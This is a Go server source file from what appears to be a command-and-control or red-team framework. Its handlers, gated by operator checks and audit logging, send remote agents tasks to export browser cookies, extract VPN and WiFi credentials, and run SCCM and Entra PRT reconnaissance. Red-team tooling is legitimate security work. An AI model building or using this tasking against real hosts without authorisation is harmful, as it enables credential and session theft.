package server

import (
	"fmt"

	"github.com/gin-gonic/gin"
)

// handleCookieExport dispatches cookie_export task to the agent.
func (s *Server) handleCookieExport(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	browser := c.PostForm("browser")
	if browser == "" {
		browser = c.Query("browser")
	}
	if browser == "" {
		browser = "all"
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "cookie_export", Command: browser})
	if task == nil {
		return
	}
	s.LogAuditRecord(c, "cookie_export", "agent", id, "Cookie export: "+browser, true, nil)
	s.dispatchTask(c, task, "cookie_export", "Cookie export: "+browser)
}

func (s *Server) handleSccmRecon(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: "sccm_recon"})
	if task == nil {
		return
	}
	s.dispatchTask(c, task, "sccm_recon", "SCCM/MECM recon")
}

func (s *Server) handleEntraPRT(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: "entra_prt"})
	if task == nil {
		return
	}
	s.dispatchTask(c, task, "entra_prt", "Entra PRT recon")
}

// handleVpnCreds dispatches vpn_creds task to the agent.
func (s *Server) handleVpnCreds(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: "vpn_creds"})
	if task == nil {
		return
	}
	s.LogAuditRecord(c, "vpn_creds", "agent", id, "VPN credential extraction", true, nil)
	s.dispatchTask(c, task, "vpn_creds", "VPN credential extraction")
}

// handleWifiCreds handles WiFi credential extraction
func (s *Server) handleWifiCreds(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	agentID := c.Param("id")

	// Route through issueAgentTask like every sibling collector: the bare
	// Create used to skip the tenant scope, the agent-existence check and
	// the approval/lock gates inside createTask.
	task := s.issueAgentTask(c, agentID, TaskSpec{Type: "wifi_creds", Command: "wifi_creds:all"})
	if task == nil {
		return
	}

	// Log audit
	s.LogAuditRecord(c, "wifi_credential_extraction",
		fmt.Sprintf("WiFi credential extraction task %d created", task.ID),
		agentID, "Extracting all saved WiFi profiles and passwords",
		true, nil)

	respond(c, gin.H{
		"task_id": task.ID,
		"message": "WiFi credential extraction started",
	})
}
